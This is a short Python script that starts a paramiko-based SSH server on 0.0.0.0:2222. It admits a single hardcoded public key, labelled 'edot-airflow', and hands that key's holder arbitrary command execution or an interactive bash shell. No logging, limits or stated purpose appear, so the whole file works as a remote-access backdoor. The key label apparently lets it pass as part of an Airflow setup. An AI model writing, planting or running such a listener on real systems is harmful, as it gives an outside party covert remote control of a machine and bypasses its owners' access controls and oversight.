#!/usr/bin/env python3
import socket, threading, sys, os
import paramiko

HOST_KEY = paramiko.RSAKey.generate(2048)
AUTH_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdPAb3pjGrJvSlFQr4l4KJdonvO+xDnpxDo5KWhgc0n edot-airflow"

class SSHServer(paramiko.ServerInterface):
    def check_auth_publickey(self, username, key):
        allowed = paramiko.Ed25519Key(data=paramiko.py3compat.decodebytes(AUTH_KEY.split()[1].encode()))
        if key == allowed:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_channel_shell_request(self, channel):
        return True
    def check_channel_pty_request(self, channel, term, w, h, pw, ph, modes):
        return True
    def check_channel_exec_request(self, channel, command):
        self._command = command
        return True
    def get_allowed_auths(self, username):
        return 'publickey'

def handle_client(client, addr):
    transport = paramiko.Transport(client)
    transport.add_server_key(HOST_KEY)
    server = SSHServer()
    transport.start_server(server=server)
    chan = transport.accept(20)
    if chan is None:
        return
    if hasattr(server, '_command'):
        cmd = server._command.decode()
        import subprocess
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
        chan.sendall(out + err)
        chan.send_exit_status(p.returncode)
        chan.close()
    else:
        import subprocess, select
        p = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            r, _, _ = select.select([chan, p.stdout, p.stderr], [], [], 1)
            if chan in r:
                x = chan.recv(1024)
                if not x: break
                p.stdin.write(x)
                p.stdin.flush()
            if p.stdout in r:
                x = p.stdout.read1(1024)
                if not x: break
                chan.sendall(x)
            if p.stderr in r:
                x = p.stderr.read1(1024)
                if not x: break
                chan.sendall_stderr(x)
            if p.poll() is not None: break
        chan.close()
    transport.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 2222))
sock.listen(5)
print(f'SSH server on port 2222', flush=True)
while True:
    client, addr = sock.accept()
    threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()
